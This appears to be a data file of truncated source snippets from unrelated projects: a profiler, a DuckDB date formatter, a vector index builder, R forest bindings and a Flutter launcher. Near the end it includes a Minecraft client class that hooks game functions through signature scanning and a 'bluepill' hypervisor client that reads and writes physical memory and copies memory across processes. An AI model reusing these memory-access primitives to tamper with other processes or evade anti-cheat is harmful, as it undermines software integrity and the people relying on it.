defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <inttypes.h>\n\n#include \"TracyImGui.hpp\"\n#include \"TracyMouse.hpp\"\n#include \"TracyPrint.hpp\"\n#include \"TracyView.hpp\"\n\nnamespace tracy\n{\n\nenum { ChunkBits = 10 };\nenum { PageBits = 10 };\nenum { PageSize = 1 << PageBits };\nenum { PageChunkBits = ChunkBits + PageBits };\nenum { PageChunkSize = 1 << PageChunkBits };\n\nuint32_t MemDecayColor[256] = {\n    0x0, 0xFF077F07, 0xFF078007, 0xFF078207, 0xFF078307, 0xFF078507, 0xFF078707, 0xFF078807,\n    0xFF078A07, 0xFF078B07, 0xFF078D07, 0xFF078F07, 0xFF079007, 0xFF089208, 0xFF089308, 0xFF089508,\n    0xFF089708, 0xFF089808, 0xFF089A08, 0xFF089B08, 0xFF089D08, 0xFF089F08, 0xFF08A008, 0xFF08A208,\n    0xFF09A309, 0xFF09A509, 0xFF09A709, 0xFF09A809, 0xFF09AA09, 0xFF09AB09, 0xFF09AD09, 0xFF09AF09,\n    0xFF09B009, 0xFF09B209, 0xFF09B309, 0xFF09B509, 0xFF0AB70A, 0xFF0AB80A, 0xFF0ABA0A, 0xFF0ABB0A,\n    0xFF0ABD0A, 0xFF0ABF0A, 0xFF0AC00A, 0xFF0AC20A, 0xFF0AC30A, 0xFF0AC50A, 0xFF0AC70A, 0xFF0BC80B,\n    0xFF0BCA0B, 0xFF0BCB0B, 0xFF0BCD0B, 0xFF0BCF0B, 0xFF0BD00B, 0xFF0BD20B, 0xFF0BD30B, 0xFF0BD50B,\n    0xFF0BD70B, 0xFF0BD80B, 0xFF0BDA0B, 0xFF0CDB0C, 0xFF0CDD0C, 0xFF0CDF0C, 0xFF0CE00C, 0xFF0CE20C,\n    0xFF0CE30C, 0xFF0CE50C, 0xFF0CE70C, 0xFF0CE80C, 0xFF0CEA0C, 0xFF0CEB0C, 0xFF0DED0D, 0xFF0DEF0D,\n    0xFF0DF00D, 0xFF0DF20D, 0xFF0DF30D, 0xFF0DF50D, 0xFF0DF70D, 0xFF0DF80D, 0xFF0DFA0D, 0xFF0DFB0D,\n    0xFF0DFD0D, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E,\n    0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0EFF0E, 0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F,\n    0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F, 0xFF0FFF0F,\n    0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF10FF10,\n    0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF10FF10, 0xFF11FF11, 0xFF11FF11, 0xFF11FF11, 0xFF11FF11,\n    0xFF11FF11, 0xFF11FF11, 0xFF11FF11, 0xFF11FF11, 0xFF11FF11, 0xFF11FF11, 0xFF11FF11, 0xFF12FF12,\n    0x0, 0xFF1212FF, 0xFF1111FF, 0xFF1111FF, 0xFF1111FF, 0xFF1111FF, 0xFF1111FF, 0xFF1111FF,\n    0xFF1111FF, 0xFF1111FF, 0xFF1111FF, 0xFF1111FF, 0xFF1111FF, 0xFF1010FF, 0xFF1010FF, 0xFF1010FF,\n    0xFF1010FF, 0xFF1010FF, 0xFF1010FF, 0xFF1010FF, 0xFF1010FF, 0xFF1010FF, 0xFF1010FF, 0xFF1010FF,\n    0xFF1010FF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF,\n    0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0F0FFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF,\n    0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF, 0xFF0E0EFF,\n    0xFF0D0DFD, 0xFF0D0DFB, 0xFF0D0DFA, 0xFF0D0DF8, 0xFF0D0DF7, 0xFF0D0DF5, 0xFF0D0DF3, 0xFF0D0DF2,\n    0xFF0D0DF0, 0xFF0D0DEF, 0xFF0D0DED, 0xFF0C0CEB, 0xFF0C0CEA, 0xFF0C0CE8, 0xFF0C0CE7, 0xFF0C0CE5,\n    0xFF0C0CE3, 0xFF0C0CE2, 0xFF0C0CE0, 0xFF0C0CDF, 0xFF0C0CDD, 0xFF0C0CDB, 0xFF0B0BDA, 0xFF0B0BD8,\n    0xFF0B0BD7, 0xFF0B0BD5, 0xFF0B0BD3, 0xFF0B0BD2, 0xFF0B0BD0, 0xFF0B0BCF, 0xFF0B0BCD, 0xFF0B0BCB,\n    0xFF0B0BCA, 0xFF0B0BC8, 0xFF0A0AC7, 0xFF0A0AC5, 0xFF0A0AC3, 0xFF0A0AC2, 0xFF0A0AC0, 0xFF0A0ABF,\n    0xFF0A0ABD, 0xFF0A0ABB, 0xFF0A0ABA, 0xFF0A0AB8, 0xFF0A0AB7, 0xFF0909B5, 0xFF0909B3, 0xFF0909B2,\n    0xFF0909B0, 0xFF0909AF, 0xFF0909AD, 0xFF0909AB, 0xFF0909AA, 0xFF0909A8, 0xFF0909A7, 0xFF0909A5,\n    0xFF0909A3, 0xFF0808A2, 0xFF0808A0, 0xFF08089F, 0xFF08089D, 0xFF08089B, 0xFF08089A, 0xFF080898,\n    0xFF080897, 0xFF080895, 0xFF080893, 0xFF080892, 0xFF070790, 0xFF07078F, 0xFF07078D, 0xFF07078B,\n    0xFF07078A, 0xFF070788, 0xFF070787, 0xFF070785, 0xFF070783, 0xFF070782, 0xFF070780, 0xFF07077F,\n};\n\nstruct MemoryPage\n{\n    uint64_t page;\n    int8_t data[PageSize];\n};\n\nstatic tracy_force_inline MemoryPage& GetPage( unordered_flat_map<uint64_t, MemoryPage>& memmap, uint64_t page )\n{\n    auto it = memmap.find( page );\n    if( it == memmap.end() )\n    {\n        it = memmap.emplace( page, MemoryPage { page, {} } ).first;\n    }\n    return it->second;\n}\n\nstatic tracy_force_inline void FillPages( unordered_flat_map<uint64_t, MemoryPage>& memmap, uint64_t c0, uint64_t c1, int8_t val )\n{\n    auto p0 = c0 >> PageBits;\n    const auto p1 = c1 >> PageBits;\n\n    if( p0 == p1 )\n    {\n        const auto a0 = c0 & ( PageSize - 1 );\n        const auto a1 = c1 & ( PageSize - 1 );\n\n        auto& page = GetPage( memmap, p0 );\n        if( a0 == a1 )\n        {\n            page.data[a0] = val;\n        }\n        else\n        {\n            memset( page.data + a0, val, a1 - a0 + 1 );\n        }\n    }\n    else\n    {\n        {\n            const auto a0 = c0 & ( PageSize - 1 );\n            auto& page = GetPage( memmap, p0 );\n            memset( page.data + a0, val, PageSize - a0 );\n        }\n        while( ++p0 < p1 )\n        {\n            auto& page = GetPage( memmap, p0 );\n            memset( page.data, val, PageSize );\n        }\n        {\n            const auto a1 = c1 & ( PageSize - 1 );\n            auto& page = GetPage( memmap, p1 );\n            memset( page.data, val, a1 + 1 );\n        }\n    }\n}\n\nstd::vector<MemoryPage> View::GetMemoryPages() const\n{\n ",
    "#include <gtest/gtest.h>\n#include <omp.h>\n\n#include <algorithm>\n#include <boost/dynamic_bitset.hpp>\n#include <boost/program_options.hpp>\n#include <chrono>\n#include <cmath>\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\n#include \"efanna2e/distance.h\"\n#include \"efanna2e/neighbor.h\"\n#include \"efanna2e/parameters.h\"\n#include \"efanna2e/util.h\"\n#include \"index_bipartite.h\"\n\nnamespace po = boost::program_options;\n\nint main(int argc, char **argv) {\n    std::string base_data_file;\n    std::string sampled_query_data_file;\n    // std::string query_data_file;\n    std::string bipartite_index_save_file, projection_index_save_file, learn_base_nn_file, base_learn_nn_file;\n    std::string data_type;\n    std::string dist;\n    uint32_t M_bp, M_sq;\n    uint32_t M_pjbp, L_pjpq;\n    uint32_t L_pq;\n    uint32_t num_threads;\n\n    po::options_description desc{\"Arguments\"};\n    try {\n        desc.add_options()(\"help,h\", \"Print information on arguments\");\n        desc.add_options()(\"data_type\", po::value<std::string>(&data_type)->required(), \"data type <int8/uint8/float>\");\n        desc.add_options()(\"dist\", po::value<std::string>(&dist)->required(), \"distance function <l2/ip>\");\n        desc.add_options()(\"base_data_path\", po::value<std::string>(&base_data_file)->required(),\n                           \"Input data file in bin format\");\n        desc.add_options()(\"sampled_query_data_path\", po::value<std::string>(&sampled_query_data_file)->required(),\n                           \"Sampled query file in bin format\");\n        // desc.add_options()(\"query_data_path\",\n        //                    po::value<std::string>(&query_data_file)->required(),\n        //                    \"Query file in bin format\");\n        desc.add_options()(\"bipartite_index_save_path\", po::value<std::string>(&bipartite_index_save_file)->required(),\n                           \"Path prefix for saving bipartite index file components\");\n        desc.add_options()(\"projection_index_save_path\",\n                           po::value<std::string>(&projection_index_save_file)->required(),\n                           \"Path prefix for saving projetion index file components\");\n        desc.add_options()(\"M_bp\", po::value<uint32_t>(&M_bp)->default_value(32),\n                           \"Number of neighbors for base points to build the bipartite graph\");\n        desc.add_options()(\"M_sq\", po::value<uint32_t>(&M_sq)->default_value(32),\n                           \"Number of neighbors for sampled query points to build the bipartite graph\");\n        desc.add_options()(\"M_pjbp\", po::value<uint32_t>(&M_pjbp)->default_value(32),\n                           \"Number of neighbors for projection graph\");\n        desc.add_options()(\"L_pjpq\", po::value<uint32_t>(&L_pjpq)->default_value(32),\n                           \"Priority queue length for projection graph searching\");\n        desc.add_options()(\"L_pq\", po::value<uint32_t>(&L_pq)->default_value(32),\n                           \"Priority queue length for searching\");\n        desc.add_options()(\"num_threads,T\", po::value<uint32_t>(&num_threads)->default_value(omp_get_num_procs()),\n                           \"Number of threads used for building index (defaults to \"\n                           \"omp_get_num_procs())\");\n        desc.add_options()(\"learn_base_nn_path\", po::value<std::string>(&learn_base_nn_file)->required(),\n                           \"Path of learn-base NN file\");\n        desc.add_options()(\"base_learn_nn_path\", po::value<std::string>(&base_learn_nn_file)->required(),\n                           \"Path of base-learn NN file\");\n\n        po::variables_map vm;\n        po::store(po::parse_command_line(argc, argv, desc), vm);\n        if (vm.count(\"help\")) {\n            std::cout << desc;\n            return 0;\n        }\n        po::notify(vm);\n    } catch (const std::exception &ex) {\n        std::cerr << ex.what() << '\\n';\n        return -1;\n    }\n    std::cout << \"sampled query: \" << sampled_query_data_file << std::endl;\n    uint32_t base_num, base_dim, sq_num, sq_dim;\n    efanna2e::load_meta<float>(base_data_file.c_str(), base_num, base_dim);\n    efanna2e::load_meta<float>(sampled_query_data_file.c_str(), sq_num, sq_dim);\n    efanna2e::Metric dist_metric = efanna2e::INNER_PRODUCT;\n    if (dist == \"l2\") {\n        dist_metric = efanna2e::L2;\n        std::cout << \"Using l2 as distance metric\" << std::endl;\n    } else if (dist == \"ip\") {\n        dist_metric = efanna2e::INNER_PRODUCT;\n        std::cout << \"Using inner product as distance metric\" << std::endl;\n    } else if (dist == \"cosine\") {\n        dist_metric = efanna2e::COSINE;\n        std::cout << \"Using cosine as distance metric\" << std::endl;\n    } else {\n        std::cout << \"Unknown distance type: \" << dist << std::endl;\n        return -1;\n    }\n\n    float *data_bp = nullptr;\n    float *data_sq = nullptr;\n    float *aligned_data_bp = nullptr;\n    float *aligned_data_sq = nullptr;\n    efanna2e::Parameters parameters;\n    efanna2e::load_data<float>(base_da",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include <Rcpp.h>\n#include <vector>\n\n#include \"commons/globals.h\"\n#include \"forest/ForestPredictors.h\"\n#include \"forest/ForestTrainers.h\"\n#include \"RcppUtilities.h\"\n\nusing namespace grf;\n\n// [[Rcpp::export]]\nRcpp::List multi_regression_train(const Rcpp::NumericMatrix& train_matrix,\n                                  const std::vector<size_t>& outcome_index,\n                                  size_t sample_weight_index,\n                                  bool use_sample_weights,\n                                  unsigned int mtry,\n                                  unsigned int num_trees,\n                                  unsigned int min_node_size,\n                                  double sample_fraction,\n                                  bool honesty,\n                                  double honesty_fraction,\n                                  bool honesty_prune_leaves,\n                                  double alpha,\n                                  double imbalance_penalty,\n                                  std::vector<size_t>& clusters,\n                                  unsigned int samples_per_cluster,\n                                  bool compute_oob_predictions,\n                                  unsigned int num_threads,\n                                  unsigned int seed) {\n  Data data = RcppUtilities::convert_data(train_matrix);\n  data.set_outcome_index(outcome_index);\n  if (use_sample_weights) {\n    data.set_weight_index(sample_weight_index);\n  }\n\n  size_t ci_group_size = 1;\n  ForestOptions options(num_trees, ci_group_size, sample_fraction, mtry, min_node_size, honesty,\n      honesty_fraction, honesty_prune_leaves, alpha, imbalance_penalty, num_threads, seed, clusters, samples_per_cluster);\n  ForestTrainer trainer = multi_regression_trainer(data.get_num_outcomes());\n  Forest forest = trainer.train(data, options);\n\n  std::vector<Prediction> predictions;\n  if (compute_oob_predictions) {\n    ForestPredictor predictor = multi_regression_predictor(num_threads, data.get_num_outcomes());\n    predictions = predictor.predict_oob(forest, data, false);\n  }\n\n  return RcppUtilities::create_forest_object(forest, predictions);\n}\n\n// [[Rcpp::export]]\nRcpp::List multi_regression_predict(const Rcpp::List& forest_object,\n                                    const Rcpp::NumericMatrix& train_matrix,\n                                    const Rcpp::NumericMatrix& test_matrix,\n                                    size_t num_outcomes,\n                                    unsigned int num_threads) {\n  Data train_data = RcppUtilities::convert_data(train_matrix);\n\n  Data data = RcppUtilities::convert_data(test_matrix);\n  Forest forest = RcppUtilities::deserialize_forest(forest_object);\n  bool estimate_variance = false;\n  ForestPredictor predictor = multi_regression_predictor(num_threads, num_outcomes);\n  std::vector<Prediction> predictions = predictor.predict(forest, train_data, data, estimate_variance);\n\n  return RcppUtilities::create_prediction_object(predictions);\n}\n\n// [[Rcpp::export]]\nRcpp::List multi_regression_predict_oob(const Rcpp::List& forest_object,\n                                        const Rcpp::NumericMatrix& train_matrix,\n                                        size_t num_outcomes,\n                                        unsigned int num_threads) {\n  Data data = RcppUtilities::convert_data(train_matrix);\n\n  Forest forest = RcppUtilities::deserialize_forest(forest_object);\n  bool estimate_variance = false;\n  ForestPredictor predictor = multi_regression_predictor(num_threads, num_outcomes);\n  std::vector<Prediction> predictions = predictor.predict_oob(forest, data, estimate_variance);\n\n  Rcpp::List result = RcppUtilities::create_prediction_object(predictions);\n  return result;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"crud1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"duckdb/function/scalar/strftime_format.hpp\"\n#include \"duckdb/common/string_util.hpp\"\n#include \"duckdb/common/to_string.hpp\"\n#include \"duckdb/common/types/cast_helpers.hpp\"\n#include \"duckdb/common/types/date.hpp\"\n#include \"duckdb/common/types/time.hpp\"\n#include \"duckdb/common/types/timestamp.hpp\"\n#include <cctype>\n\nnamespace duckdb {\n\nidx_t StrfTimepecifierSize(StrTimeSpecifier specifier) {\n\tswitch (specifier) {\n\tcase StrTimeSpecifier::ABBREVIATED_WEEKDAY_NAME:\n\tcase StrTimeSpecifier::ABBREVIATED_MONTH_NAME:\n\t\treturn 3;\n\tcase StrTimeSpecifier::WEEKDAY_DECIMAL:\n\tcase StrTimeSpecifier::WEEKDAY_ISO:\n\t\treturn 1;\n\tcase StrTimeSpecifier::DAY_OF_MONTH_PADDED:\n\tcase StrTimeSpecifier::MONTH_DECIMAL_PADDED:\n\tcase StrTimeSpecifier::YEAR_WITHOUT_CENTURY_PADDED:\n\tcase StrTimeSpecifier::HOUR_24_PADDED:\n\tcase StrTimeSpecifier::HOUR_12_PADDED:\n\tcase StrTimeSpecifier::MINUTE_PADDED:\n\tcase StrTimeSpecifier::SECOND_PADDED:\n\tcase StrTimeSpecifier::AM_PM:\n\tcase StrTimeSpecifier::WEEK_NUMBER_PADDED_SUN_FIRST:\n\tcase StrTimeSpecifier::WEEK_NUMBER_PADDED_MON_FIRST:\n\tcase StrTimeSpecifier::WEEK_NUMBER_ISO:\n\t\treturn 2;\n\tcase StrTimeSpecifier::NANOSECOND_PADDED:\n\t\treturn 9;\n\tcase StrTimeSpecifier::MICROSECOND_PADDED:\n\t\treturn 6;\n\tcase StrTimeSpecifier::MILLISECOND_PADDED:\n\t\treturn 3;\n\tcase StrTimeSpecifier::DAY_OF_YEAR_PADDED:\n\t\treturn 3;\n\tcase StrTimeSpecifier::YEAR_ISO:\n\t\treturn 4;\n\tdefault:\n\t\treturn 0;\n\t}\n}\n\nvoid StrTimeFormat::AddLiteral(string literal) {\n\tconstant_size += literal.size();\n\tliterals.push_back(std::move(literal));\n}\n\nvoid StrTimeFormat::AddFormatSpecifier(string preceding_literal, StrTimeSpecifier specifier) {\n\tAddLiteral(std::move(preceding_literal));\n\tspecifiers.push_back(specifier);\n}\n\nvoid StrfTimeFormat::AddFormatSpecifier(string preceding_literal, StrTimeSpecifier specifier) {\n\tis_date_specifier.push_back(IsDateSpecifier(specifier));\n\tidx_t specifier_size = StrfTimepecifierSize(specifier);\n\tif (specifier_size == 0) {\n\t\t// variable length specifier\n\t\tvar_length_specifiers.push_back(specifier);\n\t} else {\n\t\t// constant size specifier\n\t\tconstant_size += specifier_size;\n\t}\n\tStrTimeFormat::AddFormatSpecifier(std::move(preceding_literal), specifier);\n}\n\nidx_t StrfTimeFormat::GetSpecifierLength(StrTimeSpecifier specifier, date_t date, dtime_t time, int32_t utc_offset,\n                                         const char *tz_name) {\n\tswitch (specifier) {\n\tcase StrTimeSpecifier::FULL_WEEKDAY_NAME:\n\t\treturn Date::DAY_NAMES[Date::ExtractISODayOfTheWeek(date) % 7].GetSize();\n\tcase StrTimeSpecifier::FULL_MONTH_NAME:\n\t\treturn Date::MONTH_NAMES[Date::ExtractMonth(date) - 1].GetSize();\n\tcase StrTimeSpecifier::YEAR_DECIMAL: {\n\t\tauto year = Date::ExtractYear(date);\n\t\t// Be consistent with WriteStandardSpecifier\n\t\tif (0 <= year && year <= 9999) {\n\t\t\treturn 4;\n\t\t} else {\n\t\t\treturn NumericHelper::SignedLength<int32_t, uint32_t>(year);\n\t\t}\n\t}\n\tcase StrTimeSpecifier::MONTH_DECIMAL: {\n\t\tidx_t len = 1;\n\t\tauto month = Date::ExtractMonth(date);\n\t\tlen += month >= 10;\n\t\treturn len;\n\t}\n\tcase StrTimeSpecifier::UTC_OFFSET:\n\t\t// \u00b1HH or \u00b1HH:MM\n\t\treturn (utc_offset % 60) ? 6 : 3;\n\tcase StrTimeSpecifier::TZ_NAME:\n\t\tif (tz_name) {\n\t\t\treturn strlen(tz_name);\n\t\t}\n\t\t// empty for now\n\t\treturn 0;\n\tcase StrTimeSpecifier::HOUR_24_DECIMAL:\n\tcase StrTimeSpecifier::HOUR_12_DECIMAL:\n\tcase StrTimeSpecifier::MINUTE_DECIMAL:\n\tcase StrTimeSpecifier::SECOND_DECIMAL: {\n\t\t// time specifiers\n\t\tidx_t len = 1;\n\t\tint32_t hour, min, sec, msec;\n\t\tTime::Convert(time, hour, min, sec, msec);\n\t\tswitch (specifier) {\n\t\tcase StrTimeSpecifier::HOUR_24_DECIMAL:\n\t\t\tlen += hour >= 10;\n\t\t\tbreak;\n\t\tcase StrTimeSpecifier::HOUR_12_DECIMAL:\n\t\t\thour = hour % 12;\n\t\t\tif (hour == 0) {\n\t\t\t\thour = 12;\n\t\t\t}\n\t\t\tlen += hour >= 10;\n\t\t\tbreak;\n\t\tcase StrTimeSpecifier::MINUTE_DECIMAL:\n\t\t\tlen += min >= 10;\n\t\t\tbreak;\n\t\tcase StrTimeSpecifier::SECOND_DECIMAL:\n\t\t\tlen += sec >= 10;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow InternalException(\"Time specifier mismatch\");\n\t\t}\n\t\treturn len;\n\t}\n\tcase StrTimeSpecifier::DAY_OF_MONTH:\n\t\treturn NumericHelper::UnsignedLength<uint32_t>(Date::ExtractDay(date));\n\tcase StrTimeSpecifier::DAY_OF_YEAR_DECIMAL:\n\t\treturn NumericHelper::UnsignedLength<uint32_t>(Date::ExtractDayOfTheYear(date));\n\tcase StrTimeSpecifier::YEAR_WITHOUT_CENTURY:\n\t\treturn NumericHelper::UnsignedLength<uint32_t>(AbsValue(Date::ExtractYear(date)) % 100);\n\tdefault:\n\t\tthrow InternalException(\"Unimplemented specifier for GetSpecifierLength\");\n\t}\n}\n\n//! Returns the total length of the date formatted by this format specifier\nidx_t StrfTimeFormat::GetLength(date_t date, dtime_t time, int32_t utc_offset, const char *tz_name) {\n\tidx_t size = constant_size;\n\tif (!var_length_specifiers.empty()) {\n\t\tfor (auto &specifier : var_length_specifiers) {\n\t\t\tsize += GetSpecifierLength(specifier, date, time, utc_offset, tz_name);\n\t\t}\n\t}\n\treturn size;\n}\n\nchar *StrfTimeFormat::WriteString(char *target, const string_t &str) {\n\tidx_t size = str.GetSize();\n\tmemcpy(target, str.GetData(), size);\n\treturn target + size;\n}\n\n// write a ",
    "#include \"BlockLegacy.h\"\n\n#include \"../Memory/GameData.h\"\n#include \"../Utils/Logger.h\"\n#include \"../Utils/Utils.h\"\n\nbool BlockLegacy::getCollisionShape(AABB* collShapeOut, Block* block, BlockSource* blockSource, const Vec3i* pos, Entity* actor) {\n\treturn Utils::CallVFunc<5, bool, AABB*, Block*, BlockSource*, const Vec3i*, Entity*>(this, collShapeOut, block, blockSource, pos, 0);\n}\n\nvoid BlockLegacy::liquidGetFlow(Vec3* flowOut, BlockSource* reg, const Vec3i* pos) {\n\tusing liquid_getFlow_t = int(__fastcall*)(BlockLegacy*, Vec3*, BlockSource*, const Vec3i*);\n\tstatic liquid_getFlow_t liquid_getDepth = Utils::FuncFromSigOffset<liquid_getFlow_t>(FindSignature(\"E8 ? ? ? ? 48 8B 4C 24 ? F3 0F 10 01\"), 1);\n\n\tliquid_getDepth(this, flowOut, reg, pos);\n}\n\nbool BlockLegacy::hasWater(BlockSource* reg, const Vec3i& pos) {\n\tif (this->material->isLiquid) {\n\t\treturn !this->material->isSuperHot;\n\t}\n\n\tauto liquidBlock = reg->getLiquidBlock(pos)->toLegacy();\n\treturn this != liquidBlock && liquidBlock->material->isLiquid && !liquidBlock->material->isSuperHot;\n}",
    "#include \"bluepill.h\"\n\nnamespace bluepill\n{\n\tauto get_dirbase() -> u64\n\t{\n\t\tvmcall_command_t command{};\n\t\tmemset(&command, NULL, sizeof command);\n\n\t\tcommand.present = true;\n\t\tcommand.option = vmcall_option::dirbase;\n\n\t\t// can throw invalid opcode if hypervisor is not loaded...\n\t\t__try\n\t\t{\n\t\t\thypercall(VMCALL_KEY, &command);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\treturn {};\n\t\t}\n\t\treturn command.dirbase;\n\t}\n\n\tauto translate(u64 dirbase, void* virt_addr) -> u64\n\t{\n\t\tif (!dirbase || !virt_addr)\n\t\t\treturn false;\n\n\t\tvmcall_command_t command{};\n\t\tmemset(&command, NULL, sizeof command);\n\n\t\tcommand.present = true;\n\t\tcommand.option = vmcall_option::translate;\n\t\tcommand.translate.dirbase = dirbase;\n\t\tcommand.translate.virt_addr = reinterpret_cast<u64>(virt_addr);\n\n\t\t// can throw invalid opcode if hypervisor is not loaded...\n\t\t__try\n\t\t{\n\t\t\thypercall(VMCALL_KEY, &command);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\treturn {};\n\t\t}\n\t\treturn command.translate.phys_addr;\n\t}\n\n\tauto read_phys(u64 phys_src, void* virt_dest, u64 size) -> bool\n\t{\n\t\tif (!phys_src || !virt_dest || !size)\n\t\t\treturn false;\n\n\t\tvmcall_command_t command{};\n\t\tmemset(&command, NULL, sizeof command);\n\n\t\tcommand.present = true;\n\t\tcommand.option = vmcall_option::read_phys;\n\t\tcommand.read_phys.virt_dest = reinterpret_cast<u64>(virt_dest);\n\t\tcommand.read_phys.phys_src = phys_src;\n\t\tcommand.read_phys.dirbase_dest = get_dirbase();\n\t\tcommand.read_phys.size = size;\n\n\t\t// can throw invalid opcode if hypervisor is not loaded...\n\t\t__try\n\t\t{\n\t\t\thypercall(VMCALL_KEY, &command);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\treturn command.result;\n\t}\n\n\tauto write_phys(u64 phys_dest, void* src, u64 size) -> bool\n\t{\n\t\tif (!phys_dest || !src || !size)\n\t\t\treturn false;\n\n\t\tvmcall_command_t command{};\n\t\tmemset(&command, NULL, sizeof command);\n\n\t\tcommand.present = true;\n\t\tcommand.option = vmcall_option::write_phys;\n\t\tcommand.write_phys.virt_src = reinterpret_cast<u64>(src);\n\t\tcommand.write_phys.phys_dest = phys_dest;\n\t\tcommand.write_phys.dirbase_src = get_dirbase();\n\t\tcommand.write_phys.size = size;\n\n\t\t// can throw invalid opcode if hypervisor is not loaded...\n\t\t__try\n\t\t{\n\t\t\thypercall(VMCALL_KEY, &command);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\treturn command.result;\n\t}\n\n\tauto copy_virt(u64 dirbase_src, void* virt_src, u64 dirbase_dest, void* virt_dest, u64 size) -> bool\n\t{\n\t\tif (!dirbase_src || !virt_src || !dirbase_dest || !virt_dest)\n\t\t\treturn false;\n\n\t\tvmcall_command_t command{};\n\t\tmemset(&command, NULL, sizeof command);\n\n\t\tcommand.present = true;\n\t\tcommand.option = vmcall_option::copy_virt;\n\t\tcommand.copy_virt.dirbase_dest = dirbase_dest;\n\t\tcommand.copy_virt.virt_dest = reinterpret_cast<u64>(virt_dest);\n\t\tcommand.copy_virt.dirbase_src = dirbase_src;\n\t\tcommand.copy_virt.virt_src = reinterpret_cast<u64>(virt_src);\n\t\tcommand.copy_virt.size = size;\n\n\t\t// can throw invalid opcode if hypervisor is not loaded...\n\t\t__try\n\t\t{\n\t\t\thypercall(VMCALL_KEY, 